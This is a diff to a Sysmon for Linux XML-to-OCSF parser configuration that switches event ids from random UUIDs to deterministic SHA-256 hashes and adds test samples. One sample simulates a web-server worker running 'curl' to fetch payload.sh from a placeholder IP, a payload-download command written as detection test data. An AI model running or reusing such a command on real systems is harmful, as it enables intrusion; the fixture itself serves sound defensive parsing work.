@@ -1,6 +1,6 @@
 name: sysmon_linux_xml_ocsf
 display_name: Microsoft Sysmon for Linux (XML, OCSF)
-version: "1.1.0"
+version: "1.2.0"
 description: >
   Preserves unconsumed parsed fields in redacted, dotted snake_case unmapped keys.
   Parses raw Sysmon for Linux **XML** records into complete OCSF 1.9.0 events.
@@ -55,7 +55,7 @@ parser_vrl: |
           "metadata": {
               "version": "1.9.0",
               "profiles": ["host"],
-              "uid": uuid_v4(),
+              "uid": sha2("sysmon_linux_xml|raw|" + raw_log, variant: "SHA-256"),
               "log_level": "error",
               "log_source": "linux_sysmon",
               "product": { "name": "Sysmon for Linux", "vendor_name": "Microsoft" }
@@ -344,7 +344,7 @@ parser_vrl: |
       if record_id != "" && computer != "" && ts_str != "" {
           record_uid = join!(["sysmon_linux_xml", computer, downcase(channel), downcase(log_provider), record_id, ts_str], "|")
       }
-      if record_uid == "" { record_uid = uuid_v4() }
+      if record_uid == "" { record_uid = sha2("sysmon_linux_xml|raw|" + raw_log, variant: "SHA-256") }
 
       ocsf.metadata = {
           "version": "1.9.0",
@@ -592,3 +592,14 @@ samples:
       "class_uid": 1007
       "activity_id": 99
       "metadata.version": "1.9.0"
+  # NAN-3702 (existing sample, error branch): metadata.uid is sha256("sysmon_linux_xml|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "2026-08-18T13:00:00Z web-prod-03 sysmon: plain syslog line, not xml"
+    expect:
+      "metadata.uid": "f4078d88751d37b1cbf04427869226846cdbbdab21cc48d4c4d010c946dbb30e"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("sysmon_linux_xml|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-08-18T13:01:00.123456789Z\"/><Correlation/><Execution ProcessID=\"1284\" ThreadID=\"1284\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>web-prod-03</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">TechniqueID=T1059.004,TechniqueName=Unix Shell</Data><Data Name=\"UtcTime\">2026-08-18 13:01:00.123</Data><Data Name=\"ProcessGuid\">{d9e4a0c1-0001-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">20481</Data><Data Name=\"Image\">/usr/bin/curl</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">curl -s http://198.51.100.9/payload.sh</Data><Data Name=\"CurrentDirectory\">/tmp</Data><Data Name=\"User\">www-data</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">0</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">SHA256=3F786850E387550FDAB836ED7E6DC881DE23001B2E1B8C7C1BFA2D2A0C1FDD34</Data><Data Name=\"ParentProcessGuid\">{d9e4a0c1-0002-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">1533</Data><Data Name=\"ParentImage\">/usr/sbin/nginx</Data><Data Name=\"ParentCommandLine\">nginx: worker process</Data><Data Name=\"ParentUser\">www-data</Data></EventData></Event>"
+    expect:
+      "metadata.uid": "b4e57d438f9d0bc763d262011a5d353b02d1b3bc3240313d0bde4c46b11b58a3"
+      "metadata.original_event_uid": "b4e57d438f9d0bc763d262011a5d353b02d1b3bc3240313d0bde4c46b11b58a3"
